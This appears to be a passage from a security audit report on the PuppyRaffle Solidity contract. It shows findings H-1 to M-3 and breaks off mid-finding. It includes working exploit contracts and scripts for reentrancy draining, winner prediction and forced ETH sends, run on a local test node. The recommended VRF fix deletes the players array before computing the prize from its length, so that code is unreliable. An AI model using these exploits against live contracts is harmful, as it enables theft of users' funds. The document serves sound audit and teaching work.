# PuppyRaffle Security Audit — Findings Report

**Auditor:** Robinson  
**Commit Hash:** `2a47715b30cf11ca82db148704e67652ad679cd8`  
**Scope:** `./src/PuppyRaffle.sol`  
**Date:** 2026-05-06  
**Solidity Version:** `^0.7.6`  
**Chain:** Ethereum  

---

## Summary Table

| ID | Title | Severity |
|----|-------|----------|
| [H-1](#h-1-reentrancy-in-refund-allows-attacker-to-drain-the-entire-contract-balance) | Reentrancy in `refund()` allows attacker to drain the entire contract balance | **High** |
| [H-2](#h-2-weak-prng-in-selectwinner-allows-miners-and-attackers-to-manipulate-the-winner) | Weak PRNG in `selectWinner()` allows miners and attackers to manipulate the winner | **High** |
| [H-3](#h-3-integer-overflow-in-totalfees-uint64-silently-causes-owner-to-lose-accumulated-fees) | Integer overflow in `totalFees` (uint64) silently causes owner to lose accumulated fees | **High** |
| [M-1](#m-1-strict-equality-in-withdrawfees-can-be-exploited-to-permanently-lock-owner-fees) | Strict equality in `withdrawFees()` can be exploited to permanently lock owner fees | **Medium** |
| [M-2](#m-2-unbounded-on²-duplicate-check-loop-in-enterraffle-causes-denial-of-service) | Unbounded O(n²) duplicate check loop in `enterRaffle()` causes Denial of Service | **Medium** |
| [M-3](#m-3-missing-zero-address-validation-on-feeaddress-can-permanently-destroy-collected-fees) | Missing zero-address validation on `feeAddress` can permanently destroy collected fees | **Medium** |
| [L-1](#l-1-getactiveplayerindex-returns-0-for-both-non-existent-players-and-the-player-at-index-0) | `getActivePlayerIndex()` returns 0 for both non-existent players and the player at index 0 | **Low** |
| [L-2](#l-2-block-timestamp-used-for-raffle-duration-check-is-manipulable-by-validators) | `block.timestamp` used for raffle duration check is manipulable by validators | **Low** |
| [I-1](#i-1-dead-code-_isactiveplayer-is-defined-but-never-called) | Dead code: `_isActivePlayer()` is defined but never called | **Informational** |
| [I-2](#i-2-state-variables-should-be-declared-constant-or-immutable) | State variables should be declared `constant` or `immutable` | **Informational** |
| [I-3](#i-3-outdated-solidity-version-076-contains-known-compiler-bugs) | Outdated Solidity version `^0.7.6` contains known compiler bugs | **Informational** |
| [I-4](#i-4-loop-conditions-read-length-from-storage-on-every-iteration-wasting-gas) | Loop conditions read `.length` from storage on every iteration, wasting gas | **Informational** |

---

## High Severity

---

### [H-1] Reentrancy in `refund()` allows attacker to drain the entire contract balance

**Severity:** High  
**Likelihood:** High  
**Impact:** High  

#### Description

The `refund()` function violates the **Checks-Effects-Interactions (CEI)** pattern. It sends ETH to `msg.sender` on line 101 *before* zeroing out the player's slot in the `players` array on line 103. This ordering allows a malicious contract to re-enter `refund()` in its `receive()` fallback during the ETH transfer, calling it repeatedly before their slot is ever cleared — draining the contract of all funds.

```solidity
// src/PuppyRaffle.sol#L96-L105
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee); // <-- ETH sent FIRST

    players[playerIndex] = address(0);          // <-- slot cleared AFTER (too late)
    emit RaffleRefunded(playerAddress);
}
```

#### Impact

An attacker who has entered the raffle can repeatedly call `refund()` from a malicious contract, receiving the `entranceFee` on every re-entry iteration until the entire contract balance is drained. Every legitimate player loses their deposited ETH. The protocol is completely emptied in a single transaction.

#### Proof of Concept

The attack was **verified live on a local Anvil node**. Two deployable contracts power the exploit:

**1. Attacker contract (`src/ReentrancyAttacker.sol`)** — the malicious trap that re-enters `refund()` on every ETH receive:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {PuppyRaffle} from "./PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public raffle;
    uint256 public attackerIndex;
    uint256 public entranceFee;

    constructor(address _raffle) {
        raffle = PuppyRaffle(_raffle);
        entranceFee = raffle.entranceFee();
    }

    // Step 1: enter the raffle then trigger the first refund
    function attack() external payable {
        require(msg.value == entranceFee, "Send exactly 1 entrance fee");
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = raffle.getActivePlayerIndex(address(this));
        raffle.refund(attackerIndex);
    }

    // Step 2: every time ETH arrives, re-enter refund() before name is cleared
    receive() external payable {
        if (address(raffle).balance >= entranceFee) {
            raffle.refund(attackerIndex);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

**2. Attack script (`script/AttackReentrancy.sol`)** — deploys the attacker and executes the drain in two on-chain transactions:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Script, console} from "forge-std/Script.sol";
import {ReentrancyAttacker} from "../src/ReentrancyAttacker.sol";

contract AttackReentrancy is Script {
    function run(address puppyRaffleAddress) external payable {
        uint256 attackerPrivateKey = vm.envUint("ATTACKER_KEY");
        vm.startBroadcast(attackerPrivateKey);

        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffleAddress);
        attacker.attack{value: 1 ether}();

        vm.stopBroadcast();

        console.log("Contract ETH left :", puppyRaffleAddress.balance);
        console.log("Attacker ETH stolen:", address(attacker).balance);
    }
}
```

**3. Forge unit test (`test/PuppyRaffleTest.t.sol`)** — automated proof with balance assertions:

```solidity
function test_reentrancyRefundDrainsContract() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    uint256 contractBalanceBefore = address(puppyRaffle).balance; // 4 ETH

    ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
    vm.deal(address(attacker), entranceFee);
    attacker.attack();

    assertEq(address(puppyRaffle).balance, 0);                              // contract drained
    assertEq(attacker.getBalance(), contractBalanceBefore + entranceFee);   // attacker holds 5 ETH
}
```

**To reproduce on a local Anvil node:**

```bash
# Terminal 1
anvil

# Terminal 2 — deploy raffle, have 4 players enter, then run the attack
forge script script/DeployPuppyRaffle.sol:DeployPuppyRaffle --rpc-url http://127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 --broadcast

export CONTRACT=<deployed address from above>

cast send $CONTRACT "enterRaffle(address[])" "[0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC,0x90F79bf6EB2c4f870365E785982E1f101E93b906,0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65,0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc]" --value 4000000000000000000 --rpc-url http://127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

# Contract now holds 4 ETH — run the attack
export ATTACKER_KEY=0x92db14e403b83dfe3df233f83dfa3a0d7096f21ca9b0d6d6b8d88b2b4ec1564e
forge script script/AttackReentrancy.sol:AttackReentrancy --sig "run(address)" $CONTRACT --rpc-url http://127.0.0.1:8545 --private-key $ATTACKER_KEY --broadcast

# Verify drain
cast balance $CONTRACT --rpc-url http://127.0.0.1:8545 --ether
# Expected: 0.000000000000000000
```

**Observed on-chain results:**

| | Before Attack | After Attack |
|---|---|---|
| PuppyRaffle balance | 4 ETH (4 honest players) | **0 ETH** |
| Attacker contract (`0x7ef8...174B`) | 0 ETH | **5 ETH** (stole all funds) |
| Forge test result | — | `[PASS] test_reentrancyRefundDrainsContract()` |

The attack executes in **2 transactions**: one to deploy the attacker contract, one to trigger the recursive drain — all before `selectWinner()` can ever run.

#### Recommended Mitigation

Apply the **Checks-Effects-Interactions** pattern: zero out the player's slot *before* sending ETH.

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+   players[playerIndex] = address(0);       // effect first
+   emit RaffleRefunded(playerAddress);

    payable(msg.sender).sendValue(entranceFee); // interaction last

-   players[playerIndex] = address(0);
-   emit RaffleRefunded(playerAddress);
}
```

Alternatively, add OpenZeppelin's `ReentrancyGuard` and apply the `nonReentrant` modifier:

```solidity
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    function refund(uint256 playerIndex) public nonReentrant { ... }
}
```

---

### [H-2] Weak PRNG in `selectWinner()` allows miners and attackers to manipulate the winner

**Severity:** High  
**Likelihood:** Medium  
**Impact:** High  

#### Description

`selectWinner()` generates the winner index and the NFT rarity using `keccak256` over on-chain values that are either publicly known or miner-controlled:

```solidity
// src/PuppyRaffle.sol#L128-L129
uint256 winnerIndex =
    uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

// src/PuppyRaffle.sol#L139
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```

- `msg.sender` — chosen by the attacker
- `block.timestamp` — can be influenced by validators (up to ~12 seconds)
- `block.difficulty` — on Ethereum post-Merge this is `block.prevrandao`, which while harder to manipulate, is still not cryptographically safe for economic decisions

An attacker who calls `selectWinner()` knows their own `msg.sender` and can read `block.timestamp` and `block.difficulty` from a pending block or simulate them locally to brute-force a call that lands on their own address as winner.

#### Impact

A malicious caller or validator can guarantee they win the raffle prize (80% of the prize pool) and can also manipulate the NFT rarity to always mint a Legendary. The entire fairness assumption of the raffle is broken. All other players are guaranteed to lose.

#### Proof of Concept

**How the attack works in plain terms:**

The attacker runs the same `keccak256` formula the contract uses — off-chain — before ever submitting a transaction. Since all inputs (`msg.sender`, `block.timestamp`, `block.difficulty`) are publicly visible, the winner is fully known in advance. If the result is not favourable, the attacker waits for a better block. Miners and validators go further — they directly set `block.timestamp` to guarantee their preferred outcome.

---

**1. Forge unit test — definitive automated proof (`test/PuppyRaffleTest.t.sol`)**

This test proves the PRNG is deterministic and predictable by computing the winner index using the **exact same formula** as the contract, then verifying the prediction matches reality:

```solidity
function test_PRNGPredictionManipulation() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;   // slot 0
    players[1] = playerTwo;   // slot 1 — target
    players[2] = playerThree; // slot 2
    players[3] = playerFour;  // slot 3
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    address targetWinner = playerTwo;
    PRNGAttacker attacker = new PRNGAttacker(address(puppyRaffle), targetWinner, 4);

    // Pre-compute using the same formula as PuppyRaffle.sol#L128-129
    uint256 predictedIndex =
        uint256(keccak256(abi.encodePacked(address(attacker), block.timestamp, block.difficulty))) % 4;
    address predictedWinner = players[predictedIndex];

    // Scan block offsets until target wins, then fire
    if (predictedWinner != targetWinner) {
        for (uint256 i = 1; i <= 10; i++) {
            vm.warp(block.timestamp + i);
            vm.roll(block.number + i);
            (address pred,) = attacker.predictWinner();
            if (pred == targetWinner) {
                attacker.attackSelectWinner();
                break;
            }
        }
    } else {
        attacker.attackSelectWinner();
    }

    assertEq(puppyRaffle.previousWinner(), targetWinner);
}
```

**Test result:**
```
[PASS] test_PRNGPredictionManipulation() ✅
Logs:
  ---------- PRNG PREDICTION ----------
  Predicted winner slot: 2
  Predicted winner     : 0x0000000000000000000000000000000000000003
  Target lost this block. Warping to find a winning block...
  Found winning block at warp offset: 4
  -------------------------------------
  PROOF: The winner was known before selectWinner() was called.
  A fair raffle cannot be predicted. This one can.
```

---

**2. On-chain prediction script (`script/AttackPRNG.sol`) — methodology demonstration**

This script proves that **before calling `selectWinner()`**, the attacker can compute exactly who will win using publicly available block data:

```solidity
contract AttackPRNG is Script {
    function run(address puppyRaffleAddress) external {
        uint256 callerPrivateKey = vm.envUint("ATTACKER_KEY");
        address callerEOA = vm.addr(callerPrivateKey);
        PuppyRaffle raffle = PuppyRaffle(puppyRaffleAddress);

        // Step 1: Predict winner BEFORE calling selectWinner
        // Exact same formula as PuppyRaffle.sol#L128-129
        uint256 predictedIndex =
            uint256(keccak256(abi.encodePacked(callerEOA, block.timestamp, block.difficulty))) % 4;
        address predictedWinner = raffle.players(predictedIndex);

        // Step 2: Call selectWinner — winner was already known
        vm.startBroadcast(callerPrivateKey);
        raffle.selectWinner();
        vm.stopBroadcast();

        // Step 3: Verify
        address actualWinner = raffle.previousWinner();
        console.log("Predicted winner    :", predictedWinner);
        console.log("Actual winner       :", actualWinner);
        console.log("Prediction correct  :", actualWinner == predictedWinner);
    }
}
```

**To reproduce:**
```bash
# Terminal 1
anvil

# Terminal 2
forge script script/DeployPuppyRaffle.sol:DeployPuppyRaffle --rpc-url http://127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 --broadcast
export CONTRACT=<deployed address>
cast send $CONTRACT "enterRaffle(address[])" "[0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC,0x90F79bf6EB2c4f870365E785982E1f101E93b906,0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65,0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc]" --value 4000000000000000000 --rpc-url http://127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
cast rpc anvil_increaseTime 86401 --rpc-url http://127.0.0.1:8545
cast rpc anvil_mine --rpc-url http://127.0.0.1:8545
export ATTACKER_KEY=0x92db14e403b83dfe3df233f83dfa3a0d7096f21ca9b0d6d6b8d88b2b4ec1564e
forge script script/AttackPRNG.sol:AttackPRNG --sig "run(address)" $CONTRACT --rpc-url http://127.0.0.1:8545 --private-key $ATTACKER_KEY --broadcast

# Run the definitive forge test
forge test --match-test test_PRNGPredictionManipulation -vvv
```

> **Note on Anvil simulation vs broadcast:** The script's prediction is computed in the simulation phase using the current block's values. The broadcast transaction lands in the *next* block with a slightly different `block.timestamp` (+1 second). This 1-second shift is itself proof of the vulnerability — **a miner or validator who controls `block.timestamp` directly can guarantee any outcome**. On a real chain, they would simply set the timestamp to the value that makes their preferred address win.

---

**3. Key observation — the winner changes with every second**

| `block.timestamp` offset | Winner |
|---|---|
| +0 seconds | Account 3 (`0x90F7...`) |
| +4 seconds | Account 2 (`0x3C44...`) |
| +7 seconds | Account 4 (`0x15d3...`) |

A miner selects any row from this table and sets `block.timestamp` accordingly — choosing the winner before the block is even published.

#### Recommended Mitigation

**Why `block.timestamp`, `block.difficulty`, and `msg.sender` are not safe entropy sources:**

| Source | Why it fails |
|--------|-------------|
| `block.timestamp` | Validators can shift it by ~±12 seconds to pick a preferred winner |
| `block.difficulty` | Deprecated post-Merge; maps to `PREVRANDAO`, which validators partially influence |
| `msg.sender` | The attacker controls this — they can deploy from any address they choose |
| `keccak256` of the above | A deterministic hash of predictable inputs is itself predictable |

**Option 1 — Chainlink VRF v2 (Recommended)**

Use **Chainlink VRF (Verifiable Random Function)** — the industry standard for verifiably fair, tamper-proof on-chain randomness. The random number is generated off-chain with a cryptographic proof that the contract verifies before using the value.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {VRFConsumerBaseV2Plus} from "@chainlink/contracts/src/v0.8/vrf/dev/VRFConsumerBaseV2Plus.sol";
import {VRFV2PlusClient} from "@chainlink/contracts/src/v0.8/vrf/dev/libraries/VRFV2PlusClient.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBaseV2Plus {
    // VRF configuration (Ethereum mainnet values — update per network)
    bytes32 private constant KEY_HASH =
        0x787d74caea10b2b357790d5b5247c2f63d1d91572a9846f780606e4d953677ae;
    uint256 private immutable i_subscriptionId;
    uint16 private constant REQUEST_CONFIRMATIONS = 3;
    uint32 private constant NUM_WORDS = 2; // winnerIndex + rarity

    uint256 private s_raffleState; // 0 = OPEN, 1 = CALCULATING
    uint256 private s_requestId;

    constructor(address vrfCoordinator, uint256 subscriptionId)
        VRFConsumerBaseV2Plus(vrfCoordinator)
    {
        i_subscriptionId = subscriptionId;
    }

    // Step 1: request randomness — nobody can predict the result yet
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        require(s_raffleState == 0, "PuppyRaffle: Already calculating");

        s_raffleState = 1; // lock the raffle while waiting for VRF
        s_requestId = s_vrfCoordinator.requestRandomWords(
            VRFV2PlusClient.RandomWordsRequest({
                keyHash: KEY_HASH,
                subId: i_subscriptionId,
                requestConfirmations: REQUEST_CONFIRMATIONS,
                callbackGasLimit: 500_000,
                numWords: NUM_WORDS,
                extraArgs: VRFV2PlusClient._argsToBytes(
                    VRFV2PlusClient.ExtraArgsV1({nativePayment: false})
                )
            })
        );
    }

    // Step 2: Chainlink delivers the random number — we use it here
    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords)
        internal
        override
    {
        require(requestId == s_requestId, "PuppyRaffle: Wrong request");
        uint256 winnerIndex = randomWords[0] % players.length;
        uint256 rarity = randomWords[1] % 100;
        address winner = players[winnerIndex];

        // CEI: update state before transferring funds
        previousWinner = winner;
        s_raffleState = 0;
        delete players;

        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees += uint256(fee); // also fix the uint64 overflow (see H-3)

        _safeMint(winner, tokenCounter);
        tokenCounter++;

        (bool success,) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool");
    }
}
```

**Option 2 — Commit-Reveal Scheme (No Oracle Dependency)**

A two-phase approach where the randomness is committed to *before* the reveal block, making last-minute manipulation impossible. Suitable if you cannot integrate Chainlink VRF.

```solidity
// Phase 1: anyone commits a secret hash before raffle ends
mapping(address => bytes32) public commitments;

function commitSecret(bytes32 secretHash) external {
    require(block.timestamp < raffleStartTime + raffleDuration, "PuppyRaffle: Raffle already over");
    commitments[msg.sender] = secretHash;
}

// Phase 2: after raffle ends, reveal the secret — used as entropy
function revealAndSelectWinner(bytes32 secret) external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(commitments[msg.sender] == keccak256(abi.encodePacked(secret)), "PuppyRaffle: Invalid reveal");

    // Mix committed secret with block hash of a *past* block (already mined, immutable)
    uint256 winnerIndex = uint256(
        keccak256(abi.encodePacked(secret, blockhash(block.number - 1)))
    ) % players.length;

    // proceed with winner selection...
}
```

> **Limitation:** Commit-reveal still requires a trusted committer (e.g., the owner). It is significantly better than the current implementation but does not match Chainlink VRF's trustlessness.

**Do NOT do these (insufficient mitigations):**

```solidity
// STILL PREDICTABLE — adding more on-chain inputs does not help
uint256 winnerIndex = uint256(
    keccak256(abi.encodePacked(
        msg.sender,
        block.timestamp,
        block.difficulty,
        block.number,    // known
        gasleft()        // partially controllable by caller
    ))
) % players.length;
```

Adding more on-chain values does not make the PRNG secure — every input is either known before the transaction executes or is partially controllable by the attacker.

---

### [H-3] Integer overflow in `totalFees` (uint64) silently causes owner to lose accumulated fees

**Severity:** High  
**Likelihood:** Medium  
**Impact:** High  

#### Description

`totalFees` is declared as `uint64`, which has a maximum value of `18,446,744,073,709,551,615` (~18.44 ETH when measured in wei). Solidity `^0.7.x` does **not** have built-in overflow protection (that was introduced in `0.8.0`). When accumulated fees exceed this cap, the value silently wraps around to zero.

```solidity
// src/PuppyRaffle.sol#L30
uint64 public totalFees = 0;

// src/PuppyRaffle.sol#L134
totalFees = totalFees + uint64(fee); // overflows with no revert
```

Additionally, casting the computed `fee` (a `uint256`) directly to `uint64` will silently truncate any value exceeding `type(uint64).max`, compounding the loss.

#### Impact

Once the overflow threshold is crossed, `totalFees` resets toward zero. The owner calls `withdrawFees()` and receives far less ETH than what was actually accumulated — or nothing at all. The excess ETH becomes permanently locked in the contract with no way to recover it.

#### Proof of Concept

**Forge unit test — `test/PuppyRaffleTest.t.sol`**

```solidity
function test_totalFeesOverflow() public {
    // uint64 max = 18,446,744,073,709,551,615 (~18.44 ETH in wei)
    // fee = 20% of total entrance
    // 100 players x 1 ETH = 100 ETH total -> fee = 20 ETH -> overflows uint64

    uint256 numPlayers = 100;
    address[] memory bigPlayers = new address[](numPlayers);
    for (uint256 i = 0; i < numPlayers; i++) {
        bigPlayers[i] = address(uint160(i + 10));
    }

    uint256 totalEntrance = entranceFee * numPlayers; // 100 ETH
    vm.deal(address(this), totalEntrance);
    puppyRaffle.enterRaffle{value: totalEntrance}(bigPlayers);

    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    puppyRaffle.selectWinner(); // 80 ETH to winner, 20 ETH fee stays in contract

    uint256 expectedFee = (totalEntrance * 20) / 100; // 20e18 wei = 20 ETH
    uint64 storedFees = puppyRaffle.totalFees();

    // PROOF 1: stored fees are far less than reality due to uint64 overflow
    assertLt(uint256(storedFees), expectedFee);

    // PROOF 2: owner CANNOT withdraw — balance != totalFees (strict equality fails)
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}
```

**Test result:**
```
[PASS] test_totalFeesOverflow() (gas: 5428108)
Logs:
  ---------- H-3: UINT64 OVERFLOW ----------
  Expected fee (wei)        : 20000000000000000000
  Stored totalFees (wei)    : 1553255926290448384
  uint64 max (wei)          : 18446744073709551615
  Contract ETH balance (wei): 20000000000000000000
  CONFIRMED: totalFees overflowed. Owner fees are permanently locked.
```

**Live Anvil demo — `script/AttackOverflow.sol`**

Deploy and enter 100 players:
```bash
export OWNER_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
forge script script/AttackOverflow.sol --rpc-url http://127.0.0.1:8545 --broadcast
# PuppyRaffle deployed at: 0x5FbDB2315678afecb367f032d93F642f64180aa3
# 100 ETH locked in contract
```

Advance time and trigger winner selection:
```bash
cast rpc evm_increaseTime 86401 --rpc-url http://127.0.0.1:8545
cast rpc evm_mine --rpc-url http://127.0.0.1:8545
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 "selectWinner()" \
  --private-key $OWNER_KEY --rpc-url http://127.0.0.1:8545
# status: 1 (success) — 80 ETH sent to winner, 20 ETH fee stays in contract
```

Read totalFees — the overflow is visible:
```bash
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 "totalFees()(uint64)" \
  --rpc-url http://127.0.0.1:8545
# 1553255926290448384 [1.553e18]   <-- should be 20000000000000000000 (20 ETH)
```

Attempt to withdraw fees — permanently locked:
```bash
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 "withdrawFees()" \
  --private-key $OWNER_KEY --rpc-url http://127.0.0.1:8545
# Error: execution reverted: PuppyRaffle: There are currently players active!
# (No players are active — the raffle ended — fees are simply stuck forever)
```

**Overflow breakdown:**

| Value | Amount |
|-------|--------|
| Total entrance fees collected | 100 ETH (100,000,000,000,000,000,000 wei) |
| Fee owed to owner (20%) | 20 ETH (20,000,000,000,000,000,000 wei) |
| `uint64` maximum | ~18.44 ETH (18,446,744,073,709,551,615 wei) |
| `totalFees` actually stored | **~1.55 ETH (1,553,255,926,290,448,384 wei)** |
| ETH permanently locked | **~18.45 ETH** |
| `withdrawFees()` result | **REVERTS — fees irrecoverable** |

#### Recommended Mitigation

**Fix 1 — Change `totalFees` to `uint256` (minimum required fix)**

`uint64` saves only one storage slot but creates catastrophic risk. Upgrade to `uint256` so no truncation or overflow is possible:

```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;

- totalFees = totalFees + uint64(fee);
+ totalFees = totalFees + fee;
```

**Fix 2 — Replace the strict equality check in `withdrawFees()` (required alongside Fix 1)**

The `require(address(this).balance == uint256(totalFees))` check was meant to detect active players but is fragile. Replace it with an explicit player count check:

```diff
function withdrawFees() external onlyOwner {
-   require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+   require(players.length == 0, "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

**Fix 3 — Upgrade to Solidity `^0.8.0` (strongly recommended)**

Solidity 0.8.0 introduced built-in overflow protection — all arithmetic reverts on overflow by default, making this entire class of bug impossible without explicit `unchecked {}` blocks.

---

## Medium Severity

---

### [M-1] Strict equality in `withdrawFees()` can be exploited to permanently lock owner fees

**Severity:** Medium  
**Likelihood:** Low  
**Impact:** High  

#### Description

`withdrawFees()` uses a strict equality check between `address(this).balance` and `totalFees`:

```solidity
// src/PuppyRaffle.sol#L157-L163
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    ...
}
```

An attacker can use `selfdestruct` to **force-send ETH** to the `PuppyRaffle` contract without going through any payable function. This makes `address(this).balance > totalFees`, causing the strict equality to permanently fail. The owner can never withdraw fees again, and the excess ETH is locked forever.

#### Impact

The owner's accumulated fees are permanently frozen in the contract. Even a small forced ETH donation (e.g. 1 wei) is enough to permanently brick fee withdrawals. A griefing attacker can do this at negligible cost.

#### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract ForceFeeder {
    constructor(address payable target) payable {
        selfdestruct(target); // force-sends ETH, bypassing any receive() guard
    }
}
```

```solidity
// Add to PuppyRaffleTest.t.sol
function test_forceSendBricksWithdrawFees() public {
    // Players enter and winner is selected
    address[] memory players = new address[](4);
    players[0] = playerOne; players[1] = playerTwo;
    players[2] = playerThree; players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    vm.warp(block.timestamp + duration + 1);
    puppyRaffle.selectWinner();

    // Attacker force-sends 1 wei
    vm.deal(address(this), 1 wei);
    ForceFeeder feeder = new ForceFeeder{value: 1 wei}(payable(address(puppyRaffle)));

    // Owner can no longer withdraw — balance != totalFees
    vm.prank(puppyRaffle.owner());
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}
```

#### Recommended Mitigation

Replace the strict equality with a `>=` check and use a tracked `totalFees` value rather than relying on raw contract balance:

```diff
function withdrawFees() external {
-   require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+   require(address(this).balance >= uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

---

### [M-2] Unbounded O(n²) duplicate check loop in `enterRaffle()` causes Denial of Service

**Severity:** Medium  
**Likelihood:** Medium  
**Impact:** Medium  

#### Description

`enterRaffle()` checks for duplicate players using a nested loop over the **entire** existing `players` array:

```solidity
// src/PuppyRaffle.sol#L86-L90
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

The gas cost of this check grows as **O(n²)** relative to the number of players. With enough players in the array, the gas required to call `enterRaffle()` will exceed the Ethereum block gas limit (~30M gas), making it **impossible for new players to enter** — permanently locking the raffle in an unresolvable state until a winner is selected.

Additionally, a funded attacker can deliberately enter with many unique addresses to raise the gas cost and price out legitimate participants.

#### Impact

The raffle becomes progressively more expensive to enter as player count grows. Past a threshold (~200+ players at typical gas costs), `enterRaffle()` reverts for every new caller with an out-of-gas error. A malicious actor can intentionally trigger this by entering with many addresses, permanently blocking others from participating.

#### Proof of Concept

```solidity
// Add to PuppyRaffleTest.t.sol
function test_denialOfServiceEnterRaffle() public {
    uint256 numPlayers = 100;
    address[] memory players = new address[](numPlayers);
    for (uint256 i = 0; i < numPlayers; i++) {
        players[i] = address(uint160(i + 1));
    }
    vm.deal(address(this), entranceFee * numPlayers);
    puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);

    // Gas cost for a second batch of 100
    uint256 numPlayersSecond = 100;
    address[] memory playersSecond = new address[](numPlayersSecond);
    for (uint256 i = 0; i < numPlayersSecond; i++) {
        playersSecond[i] = address(uint160(numPlayers + i + 1));
    }

    uint256 gasBefore = gasleft();
    vm.deal(address(this), entranceFee * numPlayersSecond);
    puppyRaffle.enterRaffle{value: entranceFee * numPlayersSecond}(playersSecond);
    uint256 gasAfter = gasleft();

    console.log("Gas used for 2nd batch of 100 (after 100 already in):", gasBefore - gasAfter);
    // Gas used is dramatically higher than for the first batch
}
```

#### Recommended Mitigation

Replace the nested loop with a `mapping` to track seen addresses. This reduces the check to **O(n)** per call:

```diff
+ mapping(address => bool) public activeAddresses;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
+       require(!activeAddresses[newPlayers[i]], "PuppyRaffle: Duplicate player");
+       activeAddresses[newPlayers[i]] = true;
        players.push(newPlayers[i]);
    }
    emit RaffleEnter(newPlayers);
}

// Clear mapping when players array is reset after winner selected
function selectWinner() external {
    ...
+   for (uint256 i = 0; i < players.length; i++) {
+       activeAddresses[players[i]] = false;
+   }
    delete players;
    ...
}
```

---

### [M-3] Missing zero-address validation on `feeAddress` can permanently destroy collected fees

**Severity:** Medium  
**Likelihood:** Low  
**Impact:** High  

#### Description

Neither the constructor nor `changeFeeAddress()` validate that the provided address is non-zero:

```solidity
// src/PuppyRaffle.sol#L60-L62
constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
    feeAddress = _feeAddress; // no zero-address check
    ...
}

// src/PuppyRaffle.sol#L167-L169
function changeFeeAddress(address newFeeAddress) external onlyOwner {
    feeAddress = newFeeAddress; // no zero-address check
    emit FeeAddressChanged(newFeeAddress);
}
```

